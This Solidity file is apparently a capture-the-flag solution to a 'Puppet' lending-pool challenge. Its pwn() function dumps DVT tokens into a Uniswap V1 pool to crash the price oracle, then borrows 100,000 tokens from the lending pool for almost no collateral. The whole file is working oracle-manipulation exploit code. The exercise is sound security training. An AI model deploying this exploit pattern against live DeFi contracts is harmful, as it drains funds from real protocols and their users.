// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV1 {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);

    function getInputPrice(uint256 input_amount, uint256 input_reserve, uint256 output_reserve)
        external
        view
        returns (uint256);
}

contract AttackPuppet {
    address dvtToken;
    address player;
    IUniswapV1 v1Exchange;
    address lendingPool;

    constructor(address _dvtToken, address _player, address _v1Exchange, address _lendingPool) payable {
        dvtToken = _dvtToken;
        player = _player;
        v1Exchange = IUniswapV1(_v1Exchange);
        lendingPool = _lendingPool;
    }

    function pwn() external {
        (bool success,) =
            dvtToken.call(abi.encodeWithSignature("approve(address,uint256)", v1Exchange, type(uint256).max));

        require(success, "Approve failed");

        v1Exchange.tokenToEthSwapInput(uint256(1000e18), uint256(1), uint256(block.timestamp + 5000));

        (success,) = lendingPool.call{value: address(this).balance}(
            abi.encodeWithSignature("borrow(uint256,address)", 100_000 ether, player)
        );

        require(success, "Borrow failed");
    }

    receive() external payable {}
}
